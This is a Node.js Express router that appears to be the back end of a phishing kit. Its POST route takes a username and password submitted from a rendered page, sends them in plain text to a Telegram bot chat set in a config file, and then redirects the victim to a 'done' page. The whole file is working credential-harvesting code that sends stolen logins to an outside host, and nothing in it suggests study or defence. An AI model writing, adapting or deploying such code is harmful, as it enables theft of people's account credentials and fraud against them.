const express = require('express')
const router = express.Router()
const fetch = require('fetch')
const { BOT_TOKEN, CHAT_ID } = require('../config.json')

router.get('/', (req, res) => {
  res.render('index')
})

router.post('/sendtotelegram', (req, res) => {
  const { username, password } = req.body

  const responseMsg = `username: ${username}\npassword: ${password}`

  fetch.fetchUrl(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${responseMsg}`,
    () => {
      res.redirect('/done')
    }
  )
})

router.get('/done', (req, res) => {
  res.render('done')
})

module.exports = router
